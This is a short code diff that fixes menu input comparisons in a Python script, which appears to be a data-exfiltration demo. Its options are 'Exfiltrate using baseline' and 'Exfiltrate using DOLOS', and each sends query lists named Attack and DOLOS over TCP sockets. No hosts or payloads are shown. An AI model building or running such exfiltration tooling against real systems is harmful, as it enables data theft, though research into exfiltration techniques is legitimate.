@@ -113,10 +113,10 @@ for i in All:
 
 while True:
   var= input('Please enter a command:\n (1) Show Samples of Exfiltrated data\n (2) Exfiltrate using baseline\n (3) Exfiltrate using DOLOS\n (4) Exit\n')
-  if var ==1:
+  if var =='1':
     for key in Sample1:
       print(key+': '+ Sample1.get(key))
-  elif var==2:
+  elif var=='2':
     for k in range(2):
       query= Attack[k]
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -125,7 +125,7 @@ while True:
       data = s.recv(size)
       s.close()
       time.sleep(0.5)
-  elif var==3:
+  elif var=='3':
     for k in range(2):
       query= DOLOS[k]
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
